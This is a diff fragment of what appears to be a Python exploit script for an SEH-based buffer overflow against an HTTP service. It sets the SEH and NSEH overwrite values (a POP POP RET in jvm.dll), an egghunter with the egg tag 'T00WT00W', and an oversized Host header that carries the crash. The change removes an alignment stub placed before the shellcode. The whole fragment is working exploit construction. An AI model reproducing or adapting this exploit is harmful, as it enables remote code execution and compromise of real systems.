@@ -116,7 +116,7 @@ EGGHUNTER=(
 
 SEH="\x1E\x09\x35\x6D" # POP, POP, RET jvm.dll
 NSEH="\x77\x21" # INC ESP, INC ESP, JA 21
-ALIGN="\xEB\x03\x59\xEB\x05\xE8\xF8\xFF\xFF\xFF\x4F"
+#ALIGN="\xEB\x03\x59\xEB\x05\xE8\xF8\xFF\xFF\xFF\x4F"
 EGG="T00WT00W"
 
 CRASH = "\x4C" * 3379 + NSEH  + SEH  + "C" * 32 + EGGHUNTER  + "C" * 100 + " :7510"
@@ -126,7 +126,7 @@ buffer+="Host: " + CRASH + "\r\n"
 buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
 buffer+="User-Agent: " + "\x4C" * 700 + "\r\n"
 buffer+="Content-Length: 1048580\r\n\r\n"
-buffer+=EGG + ALIGN + SHELL
+buffer+=EGG + SHELL
 
 print "[*]Buffer Sent[*]"
 
